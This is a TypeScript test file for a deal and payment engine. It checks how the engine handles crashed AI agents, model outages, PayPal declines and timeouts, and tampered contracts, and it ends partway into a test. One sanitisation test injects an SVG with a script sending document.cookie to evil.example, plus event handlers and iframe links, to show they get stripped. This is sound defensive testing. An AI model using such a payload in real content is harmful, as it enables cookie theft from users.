/**
 * What the engine does when something goes wrong: an agent crashes, the model is down, PayPal
 * declines or cannot be reached, or stored state has been tampered with. In every case the
 * question is the same — did any money move that should not have, and is any money left on hold?
 */
import { eq } from "drizzle-orm";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { createAgents } from "@/lib/ai";
import { AiUnavailableError, type CallStructured } from "@/lib/ai/gateway";
import type { Agents } from "@/lib/ai/types";
import type { DealView } from "@/lib/api/dto";
import { closeDb, createDbSimulatedStore, createTestDb, getPayment, listPaymentOperations, type Db } from "@/lib/db";
import { contracts, payments } from "@/lib/db/schema";
import type { ScenarioId } from "@/lib/domain/scenarios";
import type { DealStatus } from "@/lib/domain/status";
import { PaymentError, SimulatedProvider, type PaymentProvider } from "@/lib/payments";
import type { ServiceContext } from "@/lib/services/context";
import { advanceDeal, completePayPalApproval, createDeal, decideDeal, getArtifactFile, getDealView } from "@/lib/services/deals";
import { committedSpendToday } from "@/lib/services/policy";
import { RATE_LIMITS } from "@/lib/services/rate-limit";
import { newSessionId } from "@/lib/services/session";

const START_MS = Date.parse("2026-10-06T05:00:00.000Z");
const APP_URL = "https://pact.test";
const DAY_MS = 24 * 60 * 60 * 1000;

let db: Db;
let nowMs = START_MS;
let simulator: SimulatedProvider;
let ctx: ServiceContext;
const scripted = createAgents({ mode: "scripted" });
const now = (): Date => new Date(nowMs);

beforeAll(async () => {
  db = await createTestDb();
  simulator = new SimulatedProvider(createDbSimulatedStore(db), { now });
  ctx = { db, agents: scripted, provider: simulator, now };
});

afterAll(async () => {
  await closeDb(db);
});

beforeEach(() => {
  nowMs = START_MS;
});

async function open(scenarioId: ScenarioId, on: ServiceContext = ctx): Promise<{ session: string; dealId: string }> {
  const session = newSessionId();
  const deal = await createDeal(on, { sessionId: session, clientKey: null }, { intent: "", scenarioId, tzOffsetMinutes: -540 });
  return { session, dealId: deal.id };
}

/** Play the deal forward — approving and paying where a human would — until it reaches `target`. */
async function driveTo(session: string, dealId: string, target: DealStatus, on: ServiceContext = ctx): Promise<DealView> {
  for (let guard = 0; guard < 40; guard += 1) {
    const deal = await getDealView(on, session, dealId);
    if (deal.status === target) return deal;
    if (deal.status === "awaiting_approval") {
      await decideDeal(on, session, dealId, { kind: "approve_spend" });
    } else if (deal.status === "awaiting_payment") {
      await simulator.approve(deal.payment?.orderId ?? "");
      await completePayPalApproval(on, { dealId, orderId: deal.payment?.orderId ?? null });
    } else if (deal.next.kind === "auto") {
      await advanceDeal(on, session, dealId, APP_URL);
    } else {
      throw new Error(`deal stopped at ${deal.status} before reaching ${target}`);
    }
  }
  throw new Error(`deal did not reach ${target}`);
}

/** The simulator with some of PayPal's answers replaced. */
function providerWith(overrides: Partial<PaymentProvider>): PaymentProvider {
  const base: PaymentProvider = {
    kind: simulator.kind,
    supportsVault: simulator.supportsVault,
    createOrder: (input) => simulator.createOrder(input),
    getOrder: (orderId) => simulator.getOrder(orderId),
    authorizeOrder: (orderId, key) => simulator.authorizeOrder(orderId, key),
    getAuthorization: (authorizationId) => simulator.getAuthorization(authorizationId),
    captureAuthorization: (input) => simulator.captureAuthorization(input),
    voidAuthorization: (authorizationId, key) => simulator.voidAuthorization(authorizationId, key),
    reauthorize: (authorizationId, amountMinor, key) => simulator.reauthorize(authorizationId, amountMinor, key),
    createVaultSetup: (input) => simulator.createVaultSetup(input),
    exchangeVaultSetup: (setupTokenId, key) => simulator.exchangeVaultSetup(setupTokenId, key),
    verifyWebhook: (headers, rawBody) => simulator.verifyWebhook(headers, rawBody),
  };
  return { ...base, ...overrides };
}

const unreachable = (): never => {
  throw new PaymentError({ issue: "NETWORK_ERROR", message: "PayPal could not be reached", retryable: true });
};
const declined = (issue: string) => (): never => {
  throw new PaymentError({ issue, message: `PayPal refused: ${issue}`, httpStatus: 422, debugId: "dbg-test-1", retryable: false });
};

function events(deal: DealView, type: string): DealView["audit"] {
  return deal.audit.filter((event) => event.type === type);
}

async function ledger(dealId: string): Promise<string[]> {
  return (await listPaymentOperations(db, dealId)).map((operation) => `${operation.kind}:${operation.status}:${operation.attempts}`);
}

/* -------------------------------------------------------------------------- */
/*  Agents                                                                     */
/* -------------------------------------------------------------------------- */

describe("an agent that crashes", () => {
  it("fails the step without changing the deal, records the failure once, and can be retried", async () => {
    const { session, dealId } = await open("happy-path");
    const before = await getDealView(ctx, session, dealId);
    const crashing: ServiceContext = {
      ...ctx,
      agents: {
        ...scripted,
        sellerMove: async () => {
          throw new TypeError("Cannot read properties of undefined (reading 'rateCard') at /srv/app/negotiators.js:41");
        },
      },
    };

    const failed = await advanceDeal(crashing, session, dealId, APP_URL);
    // A normal response, so the UI can offer "Retry": nothing ran, nothing is busy.
    expect(failed).toMatchObject({ executed: null, busy: false, deal: { status: "negotiating" } });
    expect(failed.deal.lastError).toBe("The seller agent failed to make its move. Nothing changed — retry the step.");
    expect(failed.deal.negotiation.moves).toEqual([]);
    expect(failed.deal.audit).toHaveLength(before.audit.length + 1);
    expect(failed.deal.audit[failed.deal.audit.length - 1]).toMatchObject({ actor: "system", type: "system.error", title: failed.deal.lastError });
    // Internals stay in the server log.
    expect(JSON.stringify(failed.deal)).not.toContain("rateCard");

    // The same failure again is not recorded again.
    const again = await advanceDeal(crashing, session, dealId, APP_URL);
    expect(again.deal.audit).toHaveLength(before.audit.length + 1);
    expect(again.deal.flags.auditChainValid).toBe(true);

    // With the agent back, the retry runs the step and clears the error.
    const retried = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(retried).toMatchObject({ executed: "negotiate", deal: { status: "negotiating", lastError: null } });
    expect(retried.deal.negotiation.moves).toHaveLength(1);
  });

  it("keeps the funds held and the deal in place when the seller crashes or delivers garbage", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "authorized");

    const crashing: Agents = {
      ...scripted,
      produceDelivery: async () => {
        throw new Error("studio exploded");
      },
    };
    const first = await advanceDeal({ ...ctx, agents: crashing }, session, dealId, APP_URL);
    expect(first).toMatchObject({ executed: null, deal: { status: "authorized", submissions: [], payment: { status: "authorized" } } });
    expect(first.deal.lastError).toBe("The seller agent failed to produce the delivery. Nothing changed — retry the step.");

    // Output that is not a valid submission is the same kind of failure: it never reaches storage.
    const garbage: Agents = {
      ...scripted,
      produceDelivery: (context) =>
        scripted.produceDelivery(context).then((delivery) => ({ ...delivery, artifacts: delivery.artifacts.map((artifact) => ({ ...artifact, index: 0 })) })),
    };
    const second = await advanceDeal({ ...ctx, agents: garbage }, session, dealId, APP_URL);
    expect(second).toMatchObject({ executed: null, deal: { status: "authorized", submissions: [] } });
    expect(events(second.deal, "system.error")).toHaveLength(1);

    expect((await driveTo(session, dealId, "completed")).lastError).toBeNull();
  });

  it("stores a delivery only in sanitised form, whatever the seller agent returned", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "authorized");

    // A seller that slips active content into one file, in every way an SVG can carry it.
    const hostile: Agents = {
      ...scripted,
      produceDelivery: (context) =>
        scripted.produceDelivery(context).then((delivery) => ({
          ...delivery,
          artifacts: delivery.artifacts.map((artifact, position) =>
            artifact.kind === "illustration" && position === 0
              ? {
                  ...artifact,
                  svg: artifact.svg.replace(
                    /<\/svg>\s*$/,
                    '<script>fetch("https://evil.example/"+document.cookie)</script><rect width="1" height="1" onload="alert(1)" style="background:url(https://evil.example/x)"/>' +
                      '<image href="https://evil.example/pixel.png"/><foreignObject><iframe src="https://evil.example"></iframe></foreignObject></svg>',
                  ),
                }
              : artifact,
          ),
        })),
    };
    const delivered = await advanceDeal({ ...ctx, agents: hostile }, session, dealId, APP_URL);
    expect(delivered).toMatchObject({ executed: "fulfill", deal: { status: "submitted", lastError: null } });
    const stored = JSON.stringify(delivered.deal.submissions[0].artifacts);
    for (const marker of ["<script", "onload", "evil.example", "foreignObject", "<iframe", "<image", "style="]) expect(stored, marker).not.toContain(marker);
    expect(events(delivered.deal, "delivery.submitted")[0]).toMatchObject({
      detail: "PACT removed active or unsupported content from 1 file before storing it.",
      data: { artifacts: 6, sanitizedFiles: 1 },
    });
    // What is downloaded is what was stored.
    const first = delivered.deal.submissions[0].artifacts[0];
    expect((await getArtifactFile(ctx, dealId, first.id)).body).not.toContain("evil.example");

    // A file that is no SVG at all is no delivery: nothing is stored and the step can be retried.
    const { session: other, dealId: otherDeal } = await open("happy-path");
    await driveTo(other, otherDeal, "authorized");
    const garbage: Agents = {
      ...scripted,
      produceDelivery: (context) =>
        scripted.produceDelivery(context).then((delivery) => ({
          ...delivery,
          artifacts: delivery.artifacts.map((artifact) => (artifact.kind === "illustration" ? { ...artifact, svg: "<svg><script>alert(1)</script></svg>" } : artifact)),
        })),
    };
    const refused = await advanceDeal({ ...ctx, agents: garbage }, other, otherDeal, APP_URL);
    expect(refused).toMatchObject({ executed: null, deal: { status: "authorized", submissions: [], payment: { status: "authorized" } } });
    expect(refused.deal.lastError).toBe("The seller agent failed to produce the delivery. Nothing changed — retry the step.");

    // The built-in studio's files pass through untouched, byte for byte.
    const clean = await advanceDeal(ctx, other, otherDeal, APP_URL);
    expect(events(clean.deal, "delivery.submitted")[0]).toMatchObject({ detail: null, data: { sanitizedFiles: 0 } });
  });

  it("does not verify, and so does not capture, when the verifier crashes", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "submitted");
    const crashing: Agents = {
      ...scripted,
      evaluateAiRules: async () => {
        throw new Error("verifier exploded");
      },
    };
    const failed = await advanceDeal({ ...ctx, agents: crashing }, session, dealId, APP_URL);
    expect(failed).toMatchObject({ executed: null, deal: { status: "submitted", reports: [], payment: { status: "authorized", capturedMinor: 0 } } });
    expect(failed.deal.lastError).toBe("Verification could not be completed. Nothing changed — retry the step.");
  });

  it("replaces a proposal that is not a legal move with the scripted move and labels the deal degraded", async () => {
    const { session, dealId } = await open("happy-path");
    const confused: Agents = {
      ...scripted,
      // Accepting when no offer is on the table cannot be turned into a move at all.
      sellerMove: async () => ({
        move: { action: "accept", terms: null, message: "Deal!" },
        meta: { source: "ai", model: "test/confused-model", latencyMs: 12, degradedReason: null },
      }),
    };
    const first = await advanceDeal({ ...ctx, agents: confused }, session, dealId, APP_URL);
    expect(first).toMatchObject({ executed: "negotiate", deal: { status: "negotiating", flags: { aiDegraded: true } } });
    expect(first.deal.negotiation.moves[0]).toMatchObject({ actor: "seller", action: "offer", source: "scripted", model: null });
    expect(events(first.deal, "system.degraded")).toMatchObject([{ data: { step: "negotiate", reason: "invalid_move" } }]);

    // A second bad proposal in the same deal does not add a second notice.
    await advanceDeal(ctx, session, dealId, APP_URL);
    const third = await advanceDeal({ ...ctx, agents: confused }, session, dealId, APP_URL);
    expect(third.deal.negotiation.moves).toHaveLength(3);
    expect(events(third.deal, "system.degraded")).toHaveLength(1);
  });
});

describe("a model outage", () => {
  const modelOutage: CallStructured = async () => {
    throw new AiUnavailableError("timeout", "AI call failed (timeout)");
  };

  it("lets the scripted agents carry the deal, sends verification to a human, and never captures on its own", async () => {
    const down: ServiceContext = { ...ctx, agents: createAgents({ mode: "ai", call: modelOutage }) };
    const { session, dealId } = await open("happy-path", down);
    const created = await getDealView(down, session, dealId);
    expect(created.flags.aiDegraded).toBe(true);
    expect(events(created, "system.degraded")).toMatchObject([{ data: { step: "intent", reason: "timeout" } }]);

    const review = await driveTo(session, dealId, "in_review", down);
    // The work is complete, but nobody judged the brief: that is never enough to move money.
    expect(review.reports[0]).toMatchObject({ decision: "human_review", degraded: true, failedRuleIds: [], confidence: 0 });
    expect(review.negotiation.moves.every((move) => move.source === "scripted")).toBe(true);
    expect(review.payment).toMatchObject({ status: "authorized", capturedMinor: 0 });
    // One notice per kind of step, however many moves were affected.
    const degraded = events(review, "system.degraded").map((event) => event.data?.step);
    expect(degraded).toEqual([...new Set(degraded)]);
    expect(degraded).toEqual(expect.arrayContaining(["intent", "negotiate", "verify"]));

    // The engine has nothing automatic left to do: only a human can release.
    expect(await advanceDeal(down, session, dealId, APP_URL)).toMatchObject({ executed: null, busy: false, deal: { status: "in_review" } });
    expect((await ledger(dealId)).some((line) => line.startsWith("capture"))).toBe(false);

    await decideDeal(down, session, dealId, { kind: "release_payment" });
    const done = await driveTo(session, dealId, "completed", down);
    expect(done.payment).toMatchObject({ status: "captured", capturedMinor: 4700 });
    expect(done.flags).toMatchObject({ aiDegraded: true, auditChainValid: true });
  });
});

/* -------------------------------------------------------------------------- */
/*  Capture                                                                    */
/* -------------------------------------------------------------------------- */

describe("a capture that does not go through", () => {
  it("declined by PayPal: the deal fails and the authorization is voided in the same step", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    const authorizationId = verified.payment?.authorizationId ?? "";
    const declining: ServiceContext = {
      ...ctx,
      provider: providerWith({
        captureAuthorization: async (input) => ({ captureId: "SIM-C-DECLINED", status: "DECLINED", amountMinor: input.amountMinor, currency: "USD", finalCapture: true }),
      }),
    };

    const result = await advanceDeal(declining, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "capture", deal: { status: "failed", payment: { status: "voided", capturedMinor: 0 } } });
    expect(result.deal.lastError).toBe("Simulated PayPal refused the capture. Nothing was captured.");
    expect(result.deal.audit.slice(-2).map((event) => event.type)).toEqual(["payment.failed", "payment.voided"]);
    // No money is left on hold, and none of it counts as spent.
    expect((await simulator.getAuthorization(authorizationId)).status).toBe("VOIDED");
    expect(await committedSpendToday(db, session, now())).toBe(0);
    expect(result.deal.flags.auditChainValid).toBe(true);
    // Terminal: nothing can be advanced or decided any more.
    expect(await advanceDeal(ctx, session, dealId, APP_URL)).toMatchObject({ executed: null, deal: { status: "failed" } });
  });

  it("refused with an error: the same outcome, with PayPal's issue on record", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    const refusing: ServiceContext = { ...ctx, provider: providerWith({ captureAuthorization: declined("PAYER_CANNOT_PAY") }) };

    const result = await advanceDeal(refusing, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "capture", deal: { status: "failed", payment: { status: "voided", capturedMinor: 0 } } });
    expect(result.deal.lastError).toBe("Simulated PayPal refused this step (PAYER_CANNOT_PAY). The deal cannot continue.");
    expect(events(result.deal, "payment.failed")[0]).toMatchObject({ data: { issue: "PAYER_CANNOT_PAY", debugId: "dbg-test-1" } });
    expect((await simulator.getAuthorization(verified.payment?.authorizationId ?? "")).status).toBe("VOIDED");
    expect(await ledger(dealId)).toEqual(["create_order:succeeded:1", "authorize:succeeded:1", "capture:failed:1", "void:succeeded:1"]);
  });

  it("PayPal unreachable: the deal stays verified and retryable, then completes", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "verified");
    const offline: ServiceContext = { ...ctx, provider: providerWith({ captureAuthorization: unreachable }) };

    for (let attempt = 1; attempt <= 2; attempt += 1) {
      const result = await advanceDeal(offline, session, dealId, APP_URL);
      expect(result).toMatchObject({ executed: null, busy: false, deal: { status: "verified", payment: { status: "authorized", capturedMinor: 0 } } });
      expect(result.deal.lastError).toBe("Simulated PayPal could not complete this step yet (NETWORK_ERROR). Nothing changed — retry the step.");
      expect(result.deal.payment?.lastError).toMatchObject({ issue: "NETWORK_ERROR" });
      // Recorded once, however often it is retried.
      expect(events(result.deal, "system.error")).toHaveLength(1);
    }
    expect(await ledger(dealId)).toContain("capture:failed_retryable:2");

    const done = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(done).toMatchObject({ executed: "capture", deal: { status: "completed", lastError: null, payment: { status: "captured", capturedMinor: 4700, lastError: null } } });
    expect(await ledger(dealId)).toContain("capture:succeeded:3");
  });

  it("PayPal unreachable four times: the engine gives up, fails the deal and releases the hold", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    const offline: ServiceContext = { ...ctx, provider: providerWith({ captureAuthorization: unreachable }) };

    for (let attempt = 1; attempt <= 3; attempt += 1) {
      expect(await advanceDeal(offline, session, dealId, APP_URL)).toMatchObject({ executed: null, deal: { status: "verified" } });
    }
    const last = await advanceDeal(offline, session, dealId, APP_URL);
    expect(last).toMatchObject({ executed: "capture", deal: { status: "failed", payment: { status: "voided", capturedMinor: 0 } } });
    expect(last.deal.lastError).toBe("Simulated PayPal could not complete this step after 4 attempts (NETWORK_ERROR). The deal cannot continue.");
    expect(await ledger(dealId)).toEqual(["create_order:succeeded:1", "authorize:succeeded:1", "capture:failed_retryable:4", "void:succeeded:1"]);
    expect((await simulator.getAuthorization(verified.payment?.authorizationId ?? "")).status).toBe("VOIDED");
  });

  it("a capture that reached PayPal while every answer was lost is never written off: the deal completes", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    const authorizationId = verified.payment?.authorizationId ?? "";
    // PayPal captures — and the connection drops before the answer arrives, every time.
    const answerLost: ServiceContext = {
      ...ctx,
      provider: providerWith({
        captureAuthorization: async (input) => {
          await simulator.captureAuthorization(input);
          return unreachable();
        },
      }),
    };

    for (let attempt = 1; attempt <= 3; attempt += 1) {
      expect(await advanceDeal(answerLost, session, dealId, APP_URL)).toMatchObject({ executed: null, deal: { status: "verified" } });
    }
    // Out of attempts. Releasing the hold is refused — the authorization is captured — so the deal must not fail.
    const unknown = await advanceDeal(answerLost, session, dealId, APP_URL);
    expect(unknown).toMatchObject({ executed: null, busy: false, deal: { status: "verified", payment: { status: "authorized", capturedMinor: 0 } } });
    expect(unknown.deal.lastError).toBe(
      "Simulated PayPal has not confirmed the capture and did not release the hold (PREVIOUSLY_CAPTURED). Whether the seller was paid is not known yet — retry the step.",
    );
    expect(await ledger(dealId)).toEqual(["create_order:succeeded:1", "authorize:succeeded:1", "capture:failed_retryable:4", "void:failed:1"]);
    expect((await simulator.getAuthorization(authorizationId)).status).toBe("CAPTURED");
    const notes = unknown.deal.audit.length;
    // Asking again while nothing has changed adds nothing to the trail.
    expect((await advanceDeal(answerLost, session, dealId, APP_URL)).deal.audit).toHaveLength(notes);

    // The answer finally arrives: the same idempotency key is answered for the capture PayPal already made.
    const done = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(done).toMatchObject({ executed: "capture", deal: { status: "completed", lastError: null, payment: { status: "captured", capturedMinor: 4700 } } });
    expect(events(done.deal, "payment.captured")).toHaveLength(1);
    expect(events(done.deal, "payment.voided")).toEqual([]);
    expect(done.deal.flags.auditChainValid).toBe(true);
  });

  it("PayPal unreachable for the capture and for the release: nothing is decided, and the deal completes once PayPal is back", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    const offline: ServiceContext = { ...ctx, provider: providerWith({ captureAuthorization: unreachable, voidAuthorization: unreachable }) };

    for (let attempt = 1; attempt <= 5; attempt += 1) {
      const result = await advanceDeal(offline, session, dealId, APP_URL);
      expect(result, `attempt ${attempt}`).toMatchObject({ executed: null, deal: { status: "verified", payment: { status: "authorized", capturedMinor: 0 } } });
    }
    expect((await simulator.getAuthorization(verified.payment?.authorizationId ?? "")).status).toBe("CREATED");

    const done = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(done).toMatchObject({ executed: "capture", deal: { status: "completed", payment: { status: "captured", capturedMinor: 4700 } } });
  });

  it("pending at PayPal: the deal stays verified — not paid — and completes when the capture settles", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "verified");
    let calls = 0;
    const slow: ServiceContext = {
      ...ctx,
      provider: providerWith({
        // PayPal accepts the capture but reports it as pending the first time it is asked.
        captureAuthorization: async (input) => {
          calls += 1;
          const capture = await simulator.captureAuthorization(input);
          return calls === 1 ? { ...capture, status: "PENDING" } : capture;
        },
      }),
    };

    const pending = await advanceDeal(slow, session, dealId, APP_URL);
    expect(pending).toMatchObject({ executed: null, busy: false, deal: { status: "verified", payment: { status: "authorized", capturedMinor: 0 } } });
    expect(pending.deal.lastError).toBe("The capture is pending at the payment provider. The seller is not paid yet — retry in a moment.");
    expect(pending.deal.payment?.lastError).toMatchObject({ issue: "CAPTURE_PENDING" });
    expect(events(pending.deal, "payment.capture_pending")).toHaveLength(1);
    expect(events(pending.deal, "payment.captured")).toEqual([]);
    expect(events(pending.deal, "deal.completed")).toEqual([]);

    const done = await advanceDeal(slow, session, dealId, APP_URL);
    expect(done).toMatchObject({ executed: "capture", deal: { status: "completed", lastError: null, payment: { status: "captured", capturedMinor: 4700 } } });
    // The same idempotency key was asked twice; PayPal captured once.
    expect(calls).toBe(2);
    expect(await ledger(dealId)).toContain("capture:succeeded:2");
    expect(events(done.deal, "payment.captured")).toHaveLength(1);
  });

  it("an authorization that ran out before the capture ends the deal as expired, not failed", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    expect(verified.payment?.authorizationExpiresAt).toBe(new Date(START_MS + 29 * DAY_MS).toISOString());
    nowMs = START_MS + 30 * DAY_MS;

    const result = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "capture", deal: { status: "expired", lastError: null, payment: { status: "expired", capturedMinor: 0 } } });
    expect(result.deal.audit.slice(-3).map((event) => event.type)).toEqual(["payment.reconciled", "payment.expired", "deal.expired"]);
    expect(result.deal.audit[result.deal.audit.length - 1]).toMatchObject({
      actor: "system",
      title: "Deal expired: Simulated PayPal no longer holds the funds, so nothing can be captured",
    });
    expect((await ledger(dealId)).some((line) => line.startsWith("capture"))).toBe(false);
  });
});

/* -------------------------------------------------------------------------- */
/*  Tampering                                                                  */
/* -------------------------------------------------------------------------- */

describe("stored state that was tampered with", () => {
  it("a contract edited after signing blocks the capture: deal failed, hold released, reason on record", async () => {
    const { session, dealId } = await open("happy-path");
    const verified = await driveTo(session, dealId, "verified");
    const signed = verified.contract;
    if (!signed) throw new Error("no contract");
    // Someone with database access lowers the price in the stored contract.
    const forged = { contract: { ...signed.contract, price: { amountMinor: 100, currency: "USD" as const } }, termsHash: signed.termsHash };
    await db.update(contracts).set({ document: forged }).where(eq(contracts.dealId, dealId));

    const result = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "capture", deal: { status: "failed", payment: { status: "voided", capturedMinor: 0 } } });
    expect(result.deal.lastError).toBe("Capture was blocked by the settlement guard. Nothing was captured.");
    const blocked = events(result.deal, "payment.capture_blocked");
    expect(blocked).toHaveLength(1);
    expect(blocked[0].data).toEqual({ violations: ["contract_hash_mismatch", "amount_mismatch"] });
    expect(blocked[0].detail).toContain("may have been altered after signing");
    // Nothing was ever sent to PayPal for a capture.
    expect((await ledger(dealId)).some((line) => line.startsWith("capture"))).toBe(false);
    expect((await simulator.getAuthorization(result.deal.payment?.authorizationId ?? "")).status).toBe("VOIDED");
  });

  it("a payment record whose amount no longer matches the contract blocks the capture", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "verified");
    await db.update(payments).set({ amountMinor: 470 }).where(eq(payments.dealId, dealId));

    const result = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "capture", deal: { status: "failed", payment: { capturedMinor: 0 } } });
    expect(events(result.deal, "payment.capture_blocked")[0].data).toEqual({ violations: ["amount_mismatch"] });
    expect((await ledger(dealId)).some((line) => line.startsWith("capture"))).toBe(false);
    expect((await simulator.getAuthorization(result.deal.payment?.authorizationId ?? "")).status).toBe("VOIDED");
  });

  it("a contract edited before the order means no order is ever created", async () => {
    const { session, dealId } = await open("happy-path");
    const cleared = await driveTo(session, dealId, "payment_pending");
    const signed = cleared.contract;
    if (!signed) throw new Error("no contract");
    const forged = { contract: { ...signed.contract, price: { amountMinor: 100, currency: "USD" as const } }, termsHash: signed.termsHash };
    await db.update(contracts).set({ document: forged }).where(eq(contracts.dealId, dealId));

    const result = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "order", deal: { status: "failed", payment: { status: "none", orderId: null } } });
    expect(events(result.deal, "payment.capture_blocked")[0]).toMatchObject({ data: { reason: "CONTRACT_HASH_INVALID" } });
    expect(await ledger(dealId)).toEqual([]);
    expect(await committedSpendToday(db, session, now())).toBe(0);
  });
});

/* -------------------------------------------------------------------------- */
/*  Order and approval                                                         */
/* -------------------------------------------------------------------------- */

describe("the order and its approval", () => {
  it("PayPal unreachable when creating the order: retryable, and nothing is left reserved if it never works", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "payment_pending");
    const offline: ServiceContext = { ...ctx, provider: providerWith({ createOrder: unreachable }) };

    const first = await advanceDeal(offline, session, dealId, APP_URL);
    expect(first).toMatchObject({ executed: null, busy: false, deal: { status: "payment_pending", payment: { status: "none", orderId: null } } });
    expect(first.deal.lastError).toContain("NETWORK_ERROR");
    // The amount is reserved against the daily limit while the order is still being attempted.
    expect(await committedSpendToday(db, session, now())).toBe(4700);

    await advanceDeal(offline, session, dealId, APP_URL);
    await advanceDeal(offline, session, dealId, APP_URL);
    const last = await advanceDeal(offline, session, dealId, APP_URL);
    expect(last).toMatchObject({ executed: "order", deal: { status: "failed", payment: { status: "none" } } });
    expect(await ledger(dealId)).toEqual(["create_order:failed_retryable:4"]);
    expect(await committedSpendToday(db, session, now())).toBe(0);
  });

  it("recovers when PayPal comes back before the attempts run out", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "payment_pending");
    await advanceDeal({ ...ctx, provider: providerWith({ createOrder: unreachable }) }, session, dealId, APP_URL);

    const result = await advanceDeal(ctx, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "order", deal: { status: "awaiting_payment", lastError: null, payment: { status: "created", lastError: null } } });
    expect(await ledger(dealId)).toEqual(["create_order:succeeded:2"]);
  });

  it("an order PayPal refuses outright fails the deal at once", async () => {
    const { session, dealId } = await open("happy-path");
    await driveTo(session, dealId, "payment_pending");
    const refusing: ServiceContext = { ...ctx, provider: providerWith({ createOrder: declined("PAYEE_ACCOUNT_RESTRICTED") }) };

    const result = await advanceDeal(refusing, session, dealId, APP_URL);
    expect(result).toMatchObject({ executed: "order", deal: { status: "failed", payment: { status: "failed", orderId: null } } });
    expect(result.deal.lastError).toBe("Simulated PayPal would not open the order. The deal cannot continue.");
    expect(events(result.deal, "payment.failed")[0]).toMatchObject({ data: { issue: "PAYEE_ACCOUNT_RESTRICTED" } });
  });

  it("a return before the payer approved leaves the deal waiting and records nothing", async () => {
    const { session, dealId } = await open("happy-path");
    const waiting = await driveTo(session, dealId, "awaiting_payment");

    const outcome = await completePayPalApproval(ctx, { dealId, orderId: waiting.payment?.orderId ?? null });
    expect(outcome).toEqual({ dealId, outcome: "pending" });
    const after = await getDealView(ctx, session, dealId);
    expect(after).toMatchObject({ status: "awaiting_payment", lastError: null, payment: { status: "created", lastError: null } });
    expect(after.audit).toEqual(waiting.audit);
    expect(await ledger(dealId)).toEqual(["create_order:succeeded:1"]);
  });

  it("a return naming another order changes nothing, even after the payer approved the real one", async () => {
    const { session, dealId } = await open("happy-path");
    const waiting = await driveTo(session, dealId, "awaiting_payment");
    const other = await open("revision");
    const otherOrder = (await driveTo(other.session, other.dealId, "awaiting_payment")).payment?.orderId ?? "";
    await simulator.approve(waiting.payment?.orderId ?? "");
    await simulator.approve(otherOrder);

    for (const wrong of [otherOrder, "SIM-O-0000000000000000", "5O190127TN364715T"]) {
      expect(await completePayPalApproval(ctx, { dealId, orderId: wrong })).toEqual({ dealId, outcome: "failed" });
    }
    const after = await getDealView(ctx, session, dealId);
    expect(after).toMatchObject({ status: "awaiting_payment", payment: { status: "created", authorizedMinor: 0 } });
    // One note in the trail, however often it is tried.
    expect(after.audit).toHaveLength(waiting.audit.length + 1);
    expect(after.audit[after.audit.length - 1]).toMatchObject({ type: "system.error", title: expect.stringContaining("named a different order") });
    expect(after.flags.auditChainValid).toBe(true);
    // The other deal's order was not touched either.
    expect((await getPayment(db, other.dealId))?.status).toBe("created");

    // The right order (or no order id at all: the stored one is the authority) still works.
    expect((await completePayPalApproval(ctx, { dealId, orderId: null })).outcome).toBe("authorized");
  });

  it("bounds how often a waiting deal's return can make PACT ask PayPal", async () => {
    const { session, dealId } = await open("happy-path");
    const waiting = await driveTo(session, dealId, "awaiting_payment");
    const orderId = waiting.payment?.orderId ?? null;
    const { limit, windowSeconds } = RATE_LIMITS.approvalReturnPerDeal;

    for (let attempt = 0; attempt < limit; attempt += 1) {
      expect((await completePayPalApproval(ctx, { dealId, orderId })).outcome).toBe("pending");
    }
    await expect(completePayPalApproval(ctx, { dealId, orderId })).rejects.toMatchObject({ status: 429, code: "rate_limited" });
    // Returns that never reach PayPal (a wrong order) are not counted and still answered.
    expect((await completePayPalApproval(ctx, { dealId, orderId: "SIM-O-0000000000000000" })).outcome).toBe("failed");

    // The window passes; the payer approves; the return works.
    nowMs += windowSeconds * 1000;
    await simulator.approve(orderId ?? "");
    expect((await completePayPalApproval(ctx, { dealId, orderId })).outcome).toBe("authorized");
    expect((await getDealView(ctx, session, dealId)).status).toBe("authorized");
  });

  it("an authorization PayPal declines fails the deal: nothing is held", async () => {
    const { session, dealId } = await open("happy-path");
    const waiting = await driveTo(session, dealId, "awaiting_payment");
    await simulator.approve(waiting.payment?.orderId ?? "");
    const declining: ServiceContext = { ...ctx, provider: providerWith({ authorizeOrder: declined("INSTRUMENT_DECLINED") }) };

    expect(await completePayPalApproval(declining, { dealId, orderId: waiting.payment?.orderId ?? null })).toEqual({ dealId, outcome: "failed" });
    const after = await getDealView(ctx, session, dealId);
    expect(after).toMatchObject({ status: "failed", payment: { status: "failed", authorizedMinor: 0 } });
    expect(after.lastError).toBe("Simulated PayPal declined the authorization. Nothing is held.");
    expect(await committedSpendToday(db, session, now())).toBe(0);
  });

  it("PayPal unreachable on the return: the payer's approval is kept and the next return finishes the job", async () => {
    const { session, dealId } = await open("happy-path");
